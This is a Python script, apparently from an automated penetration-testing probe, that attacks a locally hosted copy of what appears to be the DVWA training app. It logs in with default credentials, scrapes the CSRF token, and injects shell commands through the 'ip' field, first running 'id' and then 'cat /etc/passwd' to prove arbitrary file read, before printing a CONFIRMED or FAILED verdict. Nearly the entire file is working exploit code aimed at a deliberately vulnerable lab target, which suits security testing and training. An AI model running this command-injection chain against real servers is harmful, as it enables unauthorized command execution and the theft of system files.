import requests, re, sys
# CHAIN PROBE (brain-chain-v1): exec CONFIRMED -> arbitrary file read.
# The human chain: a command-execution primitive is only the START — read a
# sensitive server-side file THROUGH it (; cat /etc/passwd) to prove impact
# beyond "uid= in output". Fixed marker, VERDICT is the LAST line.
B = 'http://172.17.0.1:3100'
marker = sys.argv[1] if len(sys.argv) > 1 else 'CHNFR7719'
s = requests.Session()
r = s.get(B + '/login.php', timeout=10)
t = re.search(r"name='user_token' value='([^']+)'", r.text)
tok = t.group(1) if t else ''
s.post(B + '/login.php',
       data={'username': 'admin', 'password': 'password',
             'Login': 'Login', 'user_token': tok}, timeout=10)

# Control: the base primitive, no file read — proves the chain adds signal.
r0 = s.post(B + '/vulnerabilities/exec/',
            data={'ip': '127.0.0.1; echo ' + marker + '; id',
                  'Submit': 'Submit'}, timeout=15)
print('control', r0.status_code, 'len', len(r0.text))
print('control marker present:', marker in r0.text)
print('control passwd present:', 'root:x:0:0' in r0.text)

# Chain: THROUGH the confirmed primitive, read /etc/passwd.
r1 = s.post(B + '/vulnerabilities/exec/',
            data={'ip': '127.0.0.1; echo ' + marker + '; cat /etc/passwd',
                  'Submit': 'Submit'}, timeout=15)
print('chained', r1.status_code, 'len', len(r1.text))
print('chained marker present:', marker in r1.text)
print('chained passwd present:', 'root:x:0:0' in r1.text)
for line in r1.text.split('\n'):
    if 'root:x:0:0' in line:
        print('CHAINED FILE LINE:', line.strip()[:160])

chained_marker = marker in r1.text
chained_file = 'root:x:0:0' in r1.text
control_file = 'root:x:0:0' in r0.text
print('verdict signals: chained_marker=%s chained_file=%s control_file=%s'
      % (chained_marker, chained_file, control_file))
# passwd content present ONLY in the chained response proves arbitrary file
# read THROUGH the command-injection primitive.
if chained_marker and chained_file and not control_file:
    print('VERDICT: CONFIRMED')
else:
    print('VERDICT: FAILED')
